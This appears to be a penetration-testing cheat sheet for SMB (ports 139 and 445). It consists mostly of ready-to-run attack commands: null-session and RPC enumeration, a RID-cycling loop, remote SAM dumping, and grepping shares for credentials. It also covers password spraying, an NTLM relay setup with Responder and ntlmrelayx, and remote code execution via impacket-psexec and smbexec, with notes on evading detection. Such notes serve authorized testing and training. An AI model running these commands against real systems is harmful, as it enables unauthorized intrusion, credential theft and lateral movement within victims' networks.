# Port 139, 445 - SMB (Server Message Block)

**Default Ports:** 445 (SMB Direct/TCP), 139 (NetBIOS Session) 
**Key Insight:** The primary vector for enumeration and lateral movement. Always check for **Null Sessions** (unauthenticated access) first.
## 1. Discovery & Null Session (Unauthenticated)
**Goal:** List shares, users, and password policies without valid credentials.
### Basic Enumeration
```shell
# Nmap - Version & Script Scan
# ⚠️ OPSEC: Moderate Noise.
sudo nmap -p 139,445 -sV -sC <IP>

# SMBClient - List Shares (Null Session)
# -N: No password | -L: List
smbclient -N -L //<IP>

# SMBMap - Permissions Check
# Quickly see if you have Read/Write access as 'null' user
smbmap -H <IP> -u "null"
```
### NetExec (Modern Standard)
**Tool:** `NetExec` (formerly CrackMapExec). 
**Syntax:** `nxc smb <Target> -u '' -p ''`
```shell
# Check Null Session & Enumerate Host Info
# Checks domain, hostname, and SMB signing status.
nxc smb <IP> -u '' -p ''

# List Shares
nxc smb <IP> -u '' -p '' --shares

# Enumerate Password Policy (Critical for Brute Force safety)
nxc smb <IP> -u '' -p '' --pass-pol
```
## 2. RPC Enumeration (Deep Dive)
**Tool:** `rpcclient` 
**Description:** Interacts directly with the MS-RPC interface. Often reveals users/groups even if listing shares fails. 
**Syntax:** `rpcclient -U "" -N <IP>`

| **Command**            | **Description**                                              |
| ------------------ | -------------------------------------------------------- |
| `srvinfo`          | Server OS and version details.                           |
| `enumdomusers`     | List all users in the domain.                            |
| `enumdomgroups`    | List all groups.                                         |
| `queryuser <RID>`  | Get detailed info on a user (RID is hex, e.g., `0x3e8`). |
| `querygroup <RID>` | Get group membership.                                    |
| `getdompwinfo`     | Get SMB password policy (min length, complexity).        |
### RID Cycling (Manual Bash Loop)
**Description:** If `enumdomusers` is denied, brute-force the RIDs (Resource IDs) to find users.
```shell
# Cycles RIDs 500-1100 and cleans output
for i in $(seq 500 1100); do 
    rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""
done
```
## 3. Automated Enumeration (Authenticated)
**Condition:** You have found credentials (`guest`, `anonymous`, or valid user).
### Enum4Linux-ng
**Install:** `git clone https://github.com/cddmp/enum4linux-ng` 
**Description:** Modern wrapper. Automates RID cycling, share listing, and policy checks. 
**Syntax:** `./enum4linux-ng.py <IP> -A`
```shell
# ⚠️ OPSEC: High Noise. Very loud.
# -A: Do everything (Users, Groups, Shares, Policy)
./enum4linux-ng.py 10.129.14.128 -A
```
### Impacket Samrdump
**Description:** Dumps the Security Account Manager (SAM) database remotely via RPC.
```shell
# Dump users and domains
impacket-samrdump <IP>
```
## 4. Interaction & Searching (Hunting for Secrets)
**Goal:** Connect to shares and search for "passwords", "config", "creds".
### SMBClient (FTP-like Interface)
```shell
# Connect
smbclient //<IP>/<SHARE> -U <USER>

# Inside SMB Prompt:
# recurse ON  -> Turn on recursive mode
# prompt OFF  -> Turn off confirmation for mget
# mget * -> Download everything
# put file    -> Upload file
```
### Mounting (Linux)
**Description:** Mount the share to use standard Linux tools (`grep`, `find`).
```shell
# 1. Create Mount Point
sudo mkdir /mnt/target_share

# 2. Mount
# -o: options (username, password, version)
sudo mount -t cifs //<IP>/<SHARE> /mnt/target_share -o username=user,password=pass,domain=.

# 3. Hunt for Secrets (Grepping)
# Look for "password", "cred", "secret" inside files
grep -rn /mnt/target_share/ -ie "pass" -ie "cred" -ie "secret"
```
## 5. Attacks
### Password Spraying
**Concept:** Test **ONE** password against **MANY** users. Avoids account lockout. 
**Tool:** `NetExec`
```shell
# Spray 'Welcome123!' against a list of users
# --continue-on-success: Don't stop after first hit
nxc smb <IP> -u users.txt -p 'Welcome123!' --continue-on-success
```
### NTLM Relay (Responder)
**Concept:** Capture an authentication attempt (LLMNR/NBT-NS) and relay it to another machine to execute code or dump hashes. 
**Requirement:** SMB Signing must be **disabled** or **not required** on the target.
```shell
# 1. Configure Responder (Disable SMB/HTTP servers)
# Edit /etc/responder/Responder.conf -> Set SMB = Off, HTTP = Off

# 2. Start Responder (Listener)
sudo responder -I tun0

# 3. Start Relay (Attacker)
# -tf: Targets File | -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support

# 4. Wait for an event (or force one via coercion)
```
## 6. Remote Code Execution (RCE)
**Condition:** You have **Administrative** credentials.

| **Tool**    | **Description**                                       | **OPSEC**                                  |
| ----------- | ----------------------------------------------------- | ------------------------------------------ |
| `PsExec`  | Uploads a service binary to `ADMIN$` and executes it. | **High Noise.** Binary touches disk.       |
| `SmbExec` | Executes commands via `cmd.exe /c` and `services`.    | **Moderate.** No binary, but service logs. |
| `WmiExec` | Executes via WMI (Port 135/445).                      | **Stealthier.** Preferred method.          |
```shell
# Impacket Examples
# Syntax: python3 <tool>.py domain/user:pass@ip

# PsExec (Classic)
impacket-psexec Administrator:Pass123@10.129.14.128

# SmbExec (Service-based)
impacket-smbexec Administrator:Pass123@10.129.14.128
```
## 7. Post-Exploitation (Local)
**Context:** You have shell access.
```shell
# Read Samba Config (Find shares/paths on Linux)
cat /etc/samba/smb.conf | grep -v "#\|;"

# Check active SMB connections
smbstatus

# Dump Samba Secrets (Local DB)
pdbedit -L -v
```